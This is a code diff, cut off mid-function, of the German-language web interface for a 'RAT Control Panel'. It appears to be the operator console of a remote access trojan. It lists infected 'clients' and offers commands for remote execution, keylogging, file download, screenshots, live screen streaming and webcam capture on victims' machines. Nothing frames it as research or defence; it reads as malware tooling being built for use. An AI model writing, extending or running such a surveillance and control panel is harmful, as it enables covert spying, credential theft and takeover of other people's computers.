@@ -3,1276 +3,1187 @@
 <head>
   <meta charset="UTF-8" />
   <link rel="icon" type="image/x-icon" href="favicon.ico" />
-  <title>RAT Control Panel</title>
+  <title>Advanced RAT Control Panel</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
   <style>
     :root {
-      --bg: #181c24;
-      --bg-panel: #23283b;
-      --text: #e6e9ef;
-      --accent: #5bc0be;
-      --accent2: #43d17a;
-      --danger: #f44336;
-      --shadow: 0 8px 32px 0 rgba(31,38,135,0.18);
-      --border: #2c2f36;
-      --panel-radius: 18px;
-      --transition: 0.18s;
-      --input-bg: #23283b;
-      --input-border: #3a506b;
-      --input-focus: #5bc0be;
-      --input-radius: 9px;
+      --primary: #3b82f6;
+      --secondary: #10b981;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --dark: #1f2937;
+      --darker: #111827;
     }
-    html, body {
-      height: 100%;
-      min-height: 100vh;
-      margin: 0;
-      padding: 0;
-      width: 100vw;
-      box-sizing: border-box;
-    }
+    
     body {
-      min-height: 100vh;
-      min-width: 100vw;
-      width: 100vw;
-      height: 100vh;
-      margin: 0;
-      padding: 0;
-      background: linear-gradient(135deg, var(--bg) 0%, #23283b 100%);
-      color: var(--text);
-      font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: stretch;
-      justify-content: stretch;
-      transition: background var(--transition), color var(--transition);
-      box-sizing: border-box;
-      overflow: hidden;
+      background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
     }
-    .container {
-      display: flex;
-      flex-direction: row;
-      gap: 32px;
-      margin: 0;
-      width: 100vw;
-      height: 100vh;
-      max-width: 100vw;
-      max-height: 100vh;
-      box-sizing: border-box;
-      align-items: stretch;
-      justify-content: stretch;
+    
+    .glass-effect {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
     }
-    .panel {
-      background: var(--bg-panel);
-      border-radius: var(--panel-radius);
-      box-shadow: var(--shadow);
-      padding: 28px 24px;
-      min-width: 320px;
-      max-width: 420px;
-      flex: 1 1 350px;
-      display: flex;
-      flex-direction: column;
-      margin-bottom: 0;
-      transition: background var(--transition), color var(--transition);
-      height: 100%;
-      box-sizing: border-box;
+    
+    .client-card {
+      transition: all 0.3s ease;
     }
-    #client-panel {
-      max-width: 340px;
-      min-width: 220px;
-      flex: 0 0 260px;
-      height: 100%;
-      box-sizing: border-box;
+    
+    .client-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
     }
-    #main-panel {
-      flex: 2 1 600px;
-      min-width: 400px;
-      max-width: 100vw;
-      height: 100%;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
+    
+    .client-card.selected {
+      border-color: var(--primary);
+      box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
     }
-    h2 {
-      margin-top: 0;
-      margin-bottom: 18px;
-      font-weight: 600;
-      font-size: 1.3em;
-      letter-spacing: 0.03em;
-      color: var(--accent);
-      border-bottom: 1px solid var(--border);
-      padding-bottom: 8px;
+    
+    .status-dot {
+      animation: pulse 2s infinite;
     }
-    #client-list {
-      list-style: none;
-      padding: 0;
-      margin: 0;
-      flex-grow: 1;
-      overflow-y: auto;
-      max-height: calc(100vh - 120px);
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
     }
-    #client-list li {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      padding: 12px 10px;
-      border-radius: 8px;
-      cursor: pointer;
-      margin-bottom: 7px;
-      border: 1px solid transparent;
-      background: var(--bg-panel);
-      transition: background var(--transition), border var(--transition);
-      font-size: 1.05em;
-      position: relative;
+    
+    .command-input {
+      background: rgba(31, 41, 55, 0.8);
+      border: 1px solid rgba(75, 85, 99, 0.5);
     }
-    #client-list li.selected, #client-list li:hover {
-      background: #26324a;
-      border-color: var(--accent);
+    
+    .command-input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
     }
-    .client-status-dot {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      background: var(--accent2);
-      margin-right: 4px;
-      box-shadow: 0 0 4px #43d17a88;
+    
+    .output-area {
+      background: rgba(17, 24, 39, 0.9);
+      font-family: 'Monaco', 'Menlo', monospace;
     }
-    .client-os {
-      width: 18px;
-      height: 18px;
-      margin-right: 6px;
-      opacity: 0.8;
+    
+    .suggestion-item {
+      transition: background-color 0.2s ease;
     }
-    .client-tooltip {
-      display: none;
-      position: absolute;
-      left: 110%;
-      top: 0;
-      background: #23283b;
-      color: #fff;
-      border-radius: 7px;
-      padding: 8px 14px;
-      font-size: 0.98em;
-      box-shadow: 0 4px 16px #000a;
-      z-index: 10;
-      min-width: 180px;
-      max-width: 320px;
-      pointer-events: none;
+    
+    .suggestion-item:hover,
+    .suggestion-item.selected {
+      background-color: rgba(59, 130, 246, 0.2);
     }
-    #client-list li:hover .client-tooltip {
-      display: block;
-    }
-    #output {
-      flex-grow: 1;
-      background: #181c24;
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 16px;
-      font-family: "Fira Mono", "Consolas", "Courier New", monospace;
-      white-space: pre-wrap;
-      word-break: break-word;
-      overflow-y: auto;
-      margin-bottom: 14px;
-      min-height: 120px;
-      max-height: 260px;
-      font-size: 1.07em;
-      position: relative;
-      box-shadow: 0 2px 12px #0002;
-    }
-    #copy-output {
-      position: absolute;
-      top: 8px;
-      right: 12px;
-      background: var(--accent);
-      color: #fff;
-      border: none;
-      border-radius: 7px;
-      padding: 6px 14px;
-      font-size: 1em;
-      cursor: pointer;
-      opacity: 0.7;
-      transition: opacity 0.15s;
-      box-shadow: 0 2px 8px #0003;
-    }
-    #copy-output:hover { opacity: 1; }
-    #controls {
-      display: flex;
-      gap: 10px;
-      flex-wrap: wrap;
-      margin-bottom: 10px;
-      align-items: center;
-      background: #23283b;
-      border-radius: 12px;
-      box-shadow: 0 2px 8px #0002;
-      padding: 14px 16px 12px 16px;
-      border: 1px solid var(--border);
-    }
-    #send-button {
-      background: linear-gradient(90deg, #5bc0be 0%, #43d17a 100%);
-      color: #fff;
-      border: none;
-      padding: 12px 24px;
-      border-radius: 10px;
-      font-size: 1.08em;
-      font-weight: 600;
-      cursor: pointer;
-      margin-left: 8px;
-      box-shadow: 0 2px 8px #0002;
-      transition: background var(--transition), box-shadow var(--transition), transform 0.1s;
-      letter-spacing: 0.03em;
-    }
-    #send-button:hover {
-      background: linear-gradient(90deg, #43d17a 0%, #5bc0be 100%);
-      box-shadow: 0 4px 16px #0003;
-      transform: translateY(-2px) scale(1.04);
-    }
-    input[type="text"] {
-      flex-grow: 1;
-      background: var(--input-bg);
-      border: 1.5px solid var(--input-border);
-      color: var(--text);
-      padding: 13px;
-      border-radius: var(--input-radius);
-      font-size: 1.08em;
-      font-family: "Fira Mono", "Consolas", "Courier New", monospace;
-      box-shadow: 0 2px 8px #0002;
-      transition: border var(--transition), box-shadow var(--transition);
-      outline: none;
-      margin-bottom: 0;
-    }
-    input[type="text"]:focus {
-      border: 2px solid var(--input-focus);
-      box-shadow: 0 4px 16px #0003;
-      background: #23283b;
-    }
-    #command-suggest {
-      font-family: "Fira Mono", "Consolas", "Courier New", monospace;
-      background: #181c24;
-      border: 1px solid var(--border);
-      border-radius: 10px;
-      margin-top: 2px;
-      box-shadow: 0 4px 16px #000a;
-      color: #fff;
-      z-index: 1000;
-      max-height: 220px;
-      overflow-y: auto;
-    }
-    #command-suggest .suggest-item {
-      padding: 8px 16px;
-      cursor: pointer;
-      border-radius: 7px;
-      transition: background 0.12s;
-      display: flex;
-      align-items: center;
-    }
-    #command-suggest .suggest-item.selected,
-    #command-suggest .suggest-item:hover {
-      background: #5bc0be;
-      color: #fff;
-    }
-    #command-suggest .suggest-desc {
-      margin-left: 12px;
-      color: #b0b0b0;
-      font-size: 0.98em;
-    }
-    /* --- Live Screen --- */
-    #screen-canvas {
-      display: block;
-      margin: 0 auto;
-      background: #181818;
-      border-radius: 10px;
-      box-shadow: 0 2px 12px #0003;
-      border: 1px solid var(--border);
+    
+    .webcam-container, .screen-container {
       max-width: 100%;
-      max-height: 60vh;
-      transition: box-shadow var(--transition);
-      cursor: zoom-in;
-      margin-top: 18px;
+      max-height: 70vh;
     }
-    #screen-status {
-      margin-top: 7px;
-      color: #b9bbbe;
-      font-size: 1em;
-      text-align: center;
-      letter-spacing: 0.01em;
+    
+    .notification {
+      animation: slideInRight 0.3s ease-out;
     }
-    /* --- Debug Panel --- */
-    #debug-panel {
-      display: none;
+    
+    @keyframes slideInRight {
+      from {
+        transform: translateX(100%);
+        opacity: 0;
+      }
+      to {
+        transform: translateX(0);
+        opacity: 1;
+      }
+    }
+    
+    .connection-indicator {
       position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100vw;
-      max-height: 30vh;
-      background: #181c24f0;
-      color: #fff;
-      font-family: "Fira Mono", monospace;
-      font-size: 0.98em;
-      border-top: 2px solid #5bc0be;
-      z-index: 9999;
-      overflow-y: auto;
-      padding: 10px 18px 10px 18px;
-      box-sizing: border-box;
-      transition: max-height 0.2s;
-    }
-    #debug-toggle {
-      position: fixed;
-      bottom: 32px;
-      right: 32px;
-      background: #23283b;
-      color: #5bc0be;
-      border: 2px solid #5bc0be;
-      border-radius: 50%;
-      width: 48px;
-      height: 48px;
-      font-size: 1.6em;
-      cursor: pointer;
-      z-index: 10000;
-      box-shadow: 0 2px 12px #0005;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: background 0.18s, color 0.18s;
-    }
-    #debug-toggle:hover {
-      background: #5bc0be;
-      color: #23283b;
-    }
-    .debug-log-entry {
-      margin-bottom: 2px;
-      white-space: pre-wrap;
-      word-break: break-all;
-    }
-    .debug-log-error { color: #f44336; }
-    .debug-log-info { color: #43d17a; }
-    .debug-log-warn { color: #ffb300; }
-    @media (max-width: 1100px) {
-      .container { flex-direction: column; align-items: stretch; }
-      #main-panel { max-width: 100%; }
-    }
-    @media (max-width: 700px) {
-      .container { flex-direction: column; gap: 10px; margin: 0; }
-      .panel { padding: 12px 6px; min-width: unset; }
-      #main-panel { min-width: unset; }
-    }
-    /* --- Discord-Style Command Suggestion --- */
-    #command-suggest {
-      position: absolute;
-      left: 0;
-      top: calc(100% + 4px); /* Abstand unter das Eingabefeld */
-      background: #23283b;
-      color: #fff;
-      border-radius: 7px;
-      box-shadow: 0 4px 16px #000a;
-      min-width: 220px;
-      max-width: 350px;
+      top: 20px;
+      right: 20px;
       z-index: 1000;
-      margin-top: 0;
-      padding: 4px 0;
-      font-size: 1em;
-      display: none;
-      max-height: 180px; /* Vorschlagsliste kleiner */
-      overflow-y: auto;  /* Scrollbar bei vielen Vorschlägen */
     }
-    #command-suggest .suggest-item {
-      padding: 8px 16px;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
+    
+    .scrollbar-thin {
+      scrollbar-width: thin;
+      scrollbar-color: rgba(156, 163, 175, 0.5) transparent;
     }
-    #command-suggest .suggest-item.selected,
-    #command-suggest .suggest-item:hover {
-      background: #5bc0be;
-      color: #fff;
+    
+    .scrollbar-thin::-webkit-scrollbar {
+      width: 6px;
     }
-    #command-suggest .suggest-desc {
-      color: #b9bbbe;
-      font-size: 0.95em;
-      margin-left: 10px;
-      flex: 1;
+    
+    .scrollbar-thin::-webkit-scrollbar-track {
+      background: transparent;
     }
-
-    /* --- Login Overlay --- */
-    #login-overlay {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      width: 100vw; height: 100vh;
-      background: rgba(24,28,36,0.97);
-      z-index: 10001;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      transition: opacity 0.2s;
-    }
-    #login-box {
-      background: #23283b;
-      border-radius: 18px;
-      box-shadow: 0 8px 32px 0 rgba(31,38,135,0.22);
-      padding: 38px 38px 30px 38px;
-      min-width: 340px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 18px;
-      border: 1.5px solid #5bc0be;
-      animation: fadeIn 0.5s;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.97);}
-      to { opacity: 1; transform: scale(1);}
-    }
-    #login-box h1 {
-      color: #5bc0be;
-      font-size: 2em;
-      margin: 0 0 10px 0;
-      font-weight: 700;
-      letter-spacing: 0.04em;
-    }
-    #login-box label {
-      color: #b9bbbe;
-      font-size: 1.08em;
-      margin-bottom: 4px;
-      align-self: flex-start;
-    }
-    #login-box input[type="text"],
-    #login-box input[type="password"] {
-      width: 100%;
-      padding: 13px 12px;
-      border-radius: 9px;
-      border: 1.5px solid #3a506b;
-      background: #181c24;
-      color: #e6e9ef;
-      font-size: 1.08em;
-      margin-bottom: 8px;
-      outline: none;
-      transition: border 0.15s, box-shadow 0.15s;
-      box-shadow: 0 2px 8px #0002;
-    }
-    #login-box input[type="text"]:focus,
-    #login-box input[type="password"]:focus {
-      border: 2px solid #5bc0be;
-      box-shadow: 0 4px 16px #0003;
-      background: #23283b;
-    }
-    #login-box button {
-      width: 100%;
-      padding: 13px 0;
-      background: linear-gradient(90deg, #5bc0be 0%, #43d17a 100%);
-      color: #fff;
-      border: none;
-      border-radius: 9px;
-      font-size: 1.13em;
-      font-weight: 600;
-      cursor: pointer;
-      margin-top: 10px;
-      box-shadow: 0 2px 8px #0003;
-      transition: background 0.18s, box-shadow 0.18s, transform 0.1s;
-      letter-spacing: 0.03em;
-    }
-    #login-box button:hover {
-      background: linear-gradient(90deg, #43d17a 0%, #5bc0be 100%);
-      box-shadow: 0 4px 16px #0003;
-      transform: translateY(-2px) scale(1.04);
-    }
-    #login-error {
-      color: #f44336;
-      font-size: 1.02em;
-      margin-top: 2px;
-      text-align: center;
-      min-height: 22px;
+    
+    .scrollbar-thin::-webkit-scrollbar-thumb {
+      background-color: rgba(156, 163, 175, 0.5);
+      border-radius: 3px;
     }
   </style>
 </head>
-<body>
-  <div id="login-overlay">
-    <form id="login-box" autocomplete="off">
-      <h1>RAT Login</h1>
-      <label for="login-user">Benutzername</label>
-      <input type="text" id="login-user" name="username" autocomplete="username" required autofocus />
-      <label for="login-pass">Passwort</label>
-      <input type="password" id="login-pass" name="password" autocomplete="current-password" required />
-      <div id="login-error"></div>
-      <button type="submit">Anmelden</button>
-    </form>
-  </div>
-  <div class="container" style="display:none;" id="main-app">
-    <div id="client-panel" class="panel">
-      <h2>Clients</h2>
-      <ul id="client-list"></ul>
-    </div>
-    <div id="main-panel" class="panel">
-      <div id="output">
-        <button id="copy-output" title="Kopieren">📋</button>
-      </div>
-      <div id="controls" style="position:relative;">
-        <input
-          type="text"
-          id="command-input"
-          placeholder="Befehle: /exec, /screenshot, /download, /history, /keylogger, /ls, /systeminfo"
-          autocomplete="off"
-        />
-        <div id="command-suggest" role="listbox" aria-label="Befehlsvorschläge"></div>
-        <button id="send-button">Senden</button>
-        <input type="file" id="upload-input" />
-      </div>
-      <div id="live-screen-area" style="display:none;">
-        <canvas id="screen-canvas" tabindex="0"></canvas>
-        <div id="screen-status"></div>
-      </div>
+<body class="text-gray-100 min-h-screen">
+  <!-- Connection Status Indicator -->
+  <div id="connection-indicator" class="connection-indicator">
+    <div id="connection-status" class="px-3 py-2 rounded-full text-sm font-medium bg-yellow-500 text-yellow-900">
+      <i class="fas fa-wifi mr-2"></i>Verbinde...
     </div>
   </div>
-  <button id="debug-toggle" title="Debug anzeigen/verstecken" style="display:none;">🐞</button>
-  <div id="debug-panel"></div>
+
+  <!-- Login Overlay -->
+  <div id="login-overlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+    <div class="glass-effect rounded-2xl p-8 w-full max-w-md mx-4">
+      <div class="text-center mb-6">
+        <i class="fas fa-shield-alt text-4xl text-blue-400 mb-4"></i>
+        <h1 class="text-3xl font-bold text-white mb-2">RAT Control Panel</h1>
+        <p class="text-gray-300">Sicherer Zugang erforderlich</p>
+      </div>
+      
+      <form id="login-form" class="space-y-4">
+        <div>
+          <label class="block text-sm font-medium text-gray-300 mb-2">Benutzername</label>
+          <input type="text" id="login-username" required
+                 class="w-full px-4 py-3 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white">
+        </div>
+        
+        <div>
+          <label class="block text-sm font-medium text-gray-300 mb-2">Passwort</label>
+          <input type="password" id="login-password" required
+                 class="w-full px-4 py-3 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white">
+        </div>
+        
+        <div id="login-error" class="text-red-400 text-sm hidden"></div>
+        
+        <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-4 rounded-lg transition duration-200">
+          <i class="fas fa-sign-in-alt mr-2"></i>Anmelden
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Main Application -->
+  <div id="main-app" class="hidden min-h-screen flex">
+    <!-- Sidebar - Client List -->
+    <div class="w-80 bg-gray-800 bg-opacity-50 p-6 overflow-y-auto scrollbar-thin">
+      <div class="mb-6">
+        <h2 class="text-xl font-bold text-white mb-4 flex items-center">
+          <i class="fas fa-desktop mr-3 text-blue-400"></i>
+          Verbundene Clients
+          <span id="client-count" class="ml-auto bg-blue-600 text-white text-xs px-2 py-1 rounded-full">0</span>
+        </h2>
+        
+        <!-- Client Actions -->
+        <div class="flex gap-2 mb-4">
+          <button id="refresh-clients" class="flex-1 bg-gray-700 hover:bg-gray-600 text-white px-3 py-2 rounded-lg transition duration-200 text-sm">
+            <i class="fas fa-sync-alt mr-2"></i>Aktualisieren
+          </button>
+          <button id="select-all-clients" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded-lg transition duration-200 text-sm">
+            <i class="fas fa-check-double mr-2"></i>Alle
+          </button>
+        </div>
+      </div>
+      
+      <!-- Client List -->
+      <div id="client-list" class="space-y-3">
+        <div class="text-center text-gray-400 py-8">
+          <i class="fas fa-satellite-dish text-3xl mb-3"></i>
+          <p>Keine Clients verbunden</p>
+          <p class="text-sm">Warte auf Verbindungen...</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Main Panel -->
+    <div class="flex-1 flex flex-col">
+      <!-- Header -->
+      <div class="bg-gray-800 bg-opacity-30 p-4 border-b border-gray-700">
+        <div class="flex items-center justify-between">
+          <div>
+            <h1 class="text-2xl font-bold text-white">Advanced RAT Control Panel</h1>
+            <p class="text-gray-300 text-sm">Ausgewählte Clients: <span id="selected-count">0</span></p>
+          </div>
+          <div class="flex items-center gap-4">
+            <button id="clear-output" class="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition duration-200">
+              <i class="fas fa-trash mr-2"></i>Leeren
+            </button>
+            <button id="export-logs" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg transition duration-200">
+              <i class="fas fa-download mr-2"></i>Export
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Command Input Section -->
+      <div class="bg-gray-800 bg-opacity-30 p-4 border-b border-gray-700">
+        <div class="flex gap-3 relative">
+          <div class="flex-1 relative">
+            <input type="text" id="command-input" placeholder="Gib einen Befehl ein... (/ für Vorschläge)"
+                   class="command-input w-full px-4 py-3 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500">
+            
+            <!-- Command Suggestions -->
+            <div id="command-suggestions" class="absolute top-full left-0 right-0 bg-gray-800 border border-gray-600 rounded-lg mt-1 max-h-64 overflow-y-auto z-10 hidden">
+              <!-- Suggestions will be populated by JavaScript -->
+            </div>
+          </div>
+          
+          <button id="send-command" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-lg font-medium transition duration-200">
+            <i class="fas fa-paper-plane mr-2"></i>Senden
+          </button>
+          
+          <input type="file" id="file-upload" class="hidden" multiple>
+          <button id="upload-btn" class="bg-green-600 hover:bg-green-700 text-white px-4 py-3 rounded-lg transition duration-200">
+            <i class="fas fa-upload"></i>
+          </button>
+        </div>
+        
+        <!-- Quick Actions -->
+        <div class="flex gap-2 mt-3 flex-wrap">
+          <button class="quick-action bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/systeminfo">
+            <i class="fas fa-info-circle mr-1"></i>System Info
+          </button>
+          <button class="quick-action bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/screenshot">
+            <i class="fas fa-camera mr-1"></i>Screenshot
+          </button>
+          <button class="quick-action bg-gray-700 hover:bg-gray-600 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/ls">
+            <i class="fas fa-folder mr-1"></i>Liste Dateien
+          </button>
+          <button class="quick-action bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/screenstream_start">
+            <i class="fas fa-desktop mr-1"></i>Screen Stream
+          </button>
+          <button class="quick-action bg-purple-600 hover:bg-purple-700 text-white px-3 py-1 rounded text-sm transition duration-200" data-command="/webcam_start">
+            <i class="fas fa-video mr-1"></i>Webcam
+          </button>
+        </div>
+      </div>
+
+      <!-- Output and Media Section -->
+      <div class="flex-1 flex flex-col lg:flex-row">
+        <!-- Output Area -->
+        <div class="flex-1 flex flex-col p-4">
+          <div class="flex items-center justify-between mb-3">
+            <h3 class="text-lg font-semibold text-white">Ausgabe</h3>
+            <button id="copy-output" class="bg-gray-700 hover:bg-gray-600 text-white px-3 py-2 rounded-lg text-sm transition duration-200">
+              <i class="fas fa-copy mr-2"></i>Kopieren
+            </button>
+          </div>
+          
+          <div id="output-area" class="output-area flex-1 p-4 rounded-lg overflow-y-auto scrollbar-thin text-sm leading-relaxed">
+            <div class="text-gray-400 text-center py-8">
+              <i class="fas fa-terminal text-3xl mb-3"></i>
+              <p>Bereit für Befehle...</p>
+              <p class="text-xs mt-2">Verwende / für Befehlsvorschläge</p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Media Area (Screenshots, Webcam, Screen Sharing) -->
+        <div class="w-full lg:w-96 p-4">
+          <div class="bg-gray-800 bg-opacity-50 rounded-lg p-4 h-full">
+            <h3 class="text-lg font-semibold text-white mb-3">Live Media</h3>
+            
+            <!-- Screenshot Display -->
+            <div id="screenshot-container" class="hidden mb-4">
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-sm text-gray-300">Screenshot</span>
+                <button id="download-screenshot" class="text-blue-400 hover:text-blue-300 text-sm">
+                  <i class="fas fa-download"></i>
+                </button>
+              </div>
+              <img id="screenshot-img" class="w-full rounded-lg border border-gray-600" alt="Screenshot">
+            </div>
+            
+            <!-- Screen Stream -->
+            <div id="screen-stream-container" class="hidden mb-4">
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-sm text-gray-300">Screen Stream</span>
+                <button id="stop-screen-stream" class="text-red-400 hover:text-red-300 text-sm">
+                  <i class="fas fa-stop-circle mr-1"></i>Stop
+                </button>
+              </div>
+              <canvas id="screen-canvas" class="w-full rounded-lg border border-gray-600 screen-container"></canvas>
+              <div id="screen-status" class="text-xs text-gray-400 mt-2 text-center"></div>
+            </div>
+            
+            <!-- Webcam Stream -->
+            <div id="webcam-container" class="hidden mb-4">
+              <div class="flex items-center justify-between mb-2">
+                <span class="text-sm text-gray-300">Webcam Stream</span>
+                <button id="stop-webcam" class="text-red-400 hover:text-red-300 text-sm">
+                  <i class="fas fa-stop-circle mr-1"></i>Stop
+                </button>
+              </div>
+              <canvas id="webcam-canvas" class="w-full rounded-lg border border-gray-600 webcam-container"></canvas>
+              <div id="webcam-status" class="text-xs text-gray-400 mt-2 text-center"></div>
+            </div>
+            
+            <!-- Placeholder when no media -->
+            <div id="media-placeholder" class="text-center text-gray-400 py-8">
+              <i class="fas fa-image text-3xl mb-3"></i>
+              <p>Keine Live-Medien</p>
+              <p class="text-xs">Screenshots und Streams erscheinen hier</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Notifications Container -->
+  <div id="notifications" class="fixed top-4 right-4 z-50 space-y-2"></div>
+
   <script>
-    // --- Login Overlay ---
-    const loginOverlay = document.getElementById('login-overlay');
-    const loginBox = document.getElementById('login-box');
-    const loginError = document.getElementById('login-error');
-    const mainApp = document.getElementById('main-app');
+    // Global Variables
+    let ws = null;
+    let selectedClients = new Set();
+    let commandHistory = [];
+    let historyIndex = -1;
+    let isAuthenticated = false;
+    let reconnectAttempts = 0;
+    let maxReconnectAttempts = 5;
 
-    function showApp() {
-      loginOverlay.style.display = "none";
-      mainApp.style.display = "";
-      document.getElementById('debug-toggle').style.display = "";
-    }
-
-    function setLoginError(msg) {
-      loginError.textContent = msg || "";
-    }
-
-    async function doLogin(username, password) {
-      try {
-        const resp = await fetch("/login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ username, password }),
-        });
-        if (!resp.ok) {
-          const data = await resp.json();
-          throw new Error(data.error || "Login fehlgeschlagen");
-        }
-        const data = await resp.json();
-        if (data.token) {
-          localStorage.setItem("rat_login", JSON.stringify({ username, token: data.token }));
-          return data.token;
-        }
-        throw new Error("Login fehlgeschlagen");
-      } catch (e) {
-        throw e;
-      }
-    }
-
-    loginBox.onsubmit = async function(e) {
-      e.preventDefault();
-      setLoginError("");
-      const username = document.getElementById('login-user').value;
-      const password = document.getElementById('login-pass').value;
-      try {
-        const token = await doLogin(username, password);
-        showApp();
-        window._rat_token = token;
-        window.initRatApp && window.initRatApp(token);
-      } catch (err) {
-        setLoginError(err.message || "Login fehlgeschlagen. Bitte überprüfe Benutzername und Passwort.");
-      }
-    };
-
-    // --- Auto-Login, wenn Token vorhanden ---
-    window.addEventListener("DOMContentLoaded", () => {
-      try {
-        const login = JSON.parse(localStorage.getItem("rat_login") || "{}");
-        if (login && login.token) {
-          showApp();
-          window._rat_token = login.token;
-          window.initRatApp && window.initRatApp(login.token);
-        }
-      } catch {}
-    });
-  </script>
-  <script>
-    // --- Globale Variablen für Client-Auswahl ---
-    let selectedClientId = null;
-    let selectedClient = null;
-
-    // --- DOM ELEMENTE OBEN DEFINIEREN ---
-    const commandInput = document.getElementById("command-input");
-    const sendButton = document.getElementById("send-button");
-    const uploadInput = document.getElementById("upload-input");
-    const output = document.getElementById("output");
-    const copyBtn = document.getElementById("copy-output");
-    const clientList = document.getElementById("client-list");
-    const screenCanvas = document.getElementById('screen-canvas');
-    const screenStatus = document.getElementById('screen-status');
-    const commandSuggest = document.getElementById("command-suggest");
-    const liveScreenArea = document.getElementById('live-screen-area');
-    const debugPanel = document.getElementById('debug-panel');
-    const debugToggle = document.getElementById('debug-toggle');
-    // Optional: Theme toggle, screenZoom, screenScreenshot, etc. nur wenn im HTML vorhanden
-    let screenZoom = document.getElementById('screen-zoom');
-    let screenScreenshot = document.getElementById('screen-screenshot');
-
-    // --- DEBUG PANEL ---
-    let debugEnabled = false;
-    debugToggle.onclick = () => {
-      debugEnabled = !debugEnabled;
-      debugPanel.style.display = debugEnabled ? "block" : "none";
-    };
-    function debugLog(msg, type="info") {
-      if (!debugPanel) return;
-      const div = document.createElement("div");
-      div.className = "debug-log-entry debug-log-" + type;
-      div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-      debugPanel.appendChild(div);
-      debugPanel.scrollTop = debugPanel.scrollHeight;
-    }
-
-    // --- OUTPUT COPY ---
-    copyBtn.onclick = () => {
-      const text = output.innerText.replace(/^📋/, '').trim();
-      navigator.clipboard.writeText(text);
-      copyBtn.textContent = "✅";
-      setTimeout(() => (copyBtn.textContent = "📋"), 1200);
-    };
-
-    // --- CLIENT-LISTENFUNKTIONEN ---
-    function osIcon(os) {
-      if (!os) return "";
-      if (os.toLowerCase().includes("windows")) return '<img class="client-os" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/windows8/windows8-original.svg" alt="Windows">';
-      if (os.toLowerCase().includes("linux")) return '<img class="client-os" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" alt="Linux">';
-      if (os.toLowerCase().includes("darwin") || os.toLowerCase().includes("mac")) return '<img class="client-os" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/apple/apple-original.svg" alt="macOS">';
-      return "";
-    }
-    function createClientListItem(client) {
-      const li = document.createElement("li");
-      li.innerHTML = `<span class="client-status-dot"></span>
-        ${osIcon(client.os)}
-        <span>${client.hostname || "Unbekannt"}</span>
-        <span style="margin-left:auto;font-size:0.97em;color:#b9bbbe;">${client.ip || (client.address ? client.address[0] : "")}</span>
-        <span class="client-tooltip">
-          <b>Hostname:</b> ${client.hostname || "?"}<br>
-          <b>OS:</b> ${client.os || "?"}<br>
-          <b>IP:</b> ${client.ip || (client.address ? client.address[0] : "")}
-        </span>`;
-      li.dataset.clientId = String(client.id); // immer als String
-      if (String(client.id) === String(selectedClientId)) li.classList.add("selected");
-      li.addEventListener("click", () => selectClient(String(client.id), client));
-      return li;
-    }
-    function renderClientList(clients) {
-      clientList.innerHTML = "";
-      if (!clients.length) {
-        const li = document.createElement("li");
-        li.textContent = "Keine Clients verbunden.";
-        li.style.color = "#b9bbbe";
-        clientList.appendChild(li);
-        return;
-      }
-      clients.forEach((client) => {
-        const li = createClientListItem(client);
-        clientList.appendChild(li);
-      });
-    }
-    function selectClient(id, clientObj) {
-      selectedClientId = String(id); // immer als String speichern
-      selectedClient = String(id);
